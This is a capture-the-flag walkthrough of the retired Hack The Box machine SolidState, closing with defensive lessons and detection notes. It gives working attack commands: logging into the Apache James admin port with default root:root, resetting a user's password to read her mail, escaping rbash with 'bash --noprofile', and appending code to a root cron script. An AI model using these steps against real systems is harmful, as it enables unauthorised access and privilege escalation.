---
machine: SolidState
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-james, default-creds, pop3, rbash, cron]
---

# SolidState — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An **Apache James 2.3.2** mail server with remote administration on 4555 and default `root:root` credentials. List the users, reset `mindy`'s password, read her mailbox over POP3 and get **SSH credentials** from the welcome mail. `mindy` lands in `rbash`, escaped with `bash --noprofile`, and root runs a writable **`/opt/tmp.py`** from cron.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.4p1 Debian 10+deb9u1
25/tcp    smtp  JAMES smtpd 2.3.2
80/tcp    http  Apache httpd 2.4.25 (Debian)
110/tcp   pop3  JAMES popd 2.3.2
119/tcp   nntp  JAMES nntpd (posting ok)
4555/tcp  rsip  JAMES Remote Administration Tool 2.3.2
```

The site is the company page. The mail ports and 4555 are the interesting part; `nmap` fingerprints the latter with James's admin banner.

## Access

```bash
nc <IP> 4555
```

```text
JAMES Remote Administration Tool 2.3.2
Login id: root
Password: root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Reset a user's password and read the mailbox over POP3:

```text
setpassword mindy <password>
```

```bash
telnet <IP> 110
```

```text
USER mindy
PASS <password>
LIST
RETR 1
```

The welcome message carries `mindy`'s SSH credentials (user and password in clear).

```bash
ssh mindy@<IP>
cat ~/user.txt
```

Alternative foothold: the public **James 2.3.2** exploit (authenticated on 4555) runs commands and yields a shell as `james`.

## Escalation

```bash
echo $SHELL
# /bin/rbash
ssh mindy@<IP> -t "bash --noprofile"
```

With a profile-less bash, normal navigation works. Enumeration:

```bash
ls -la /opt
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os, sys
try:
    os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

The script is **owned by root and writable by `mindy`**, and root runs it from cron (`pspy` confirms). Append a line that copies the flag or spawns a shell:

```bash
printf '\nos.system("cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt")\n' >> /opt/tmp.py
cat /tmp/root.txt
```

## Lessons

- An admin service with `root:root` hands over the mail server and, with it, the credentials people email each other.
- `rbash` is escaped with `bash --noprofile` over the same SSH; restricting the shell without restricting the binary achieves nothing.
- A root cron script in `/opt` writable by another user is direct escalation.
- Detection: 4555 connections from outside the mail segment, `setpassword` in the James log, and `/opt` writes followed by cron execution.
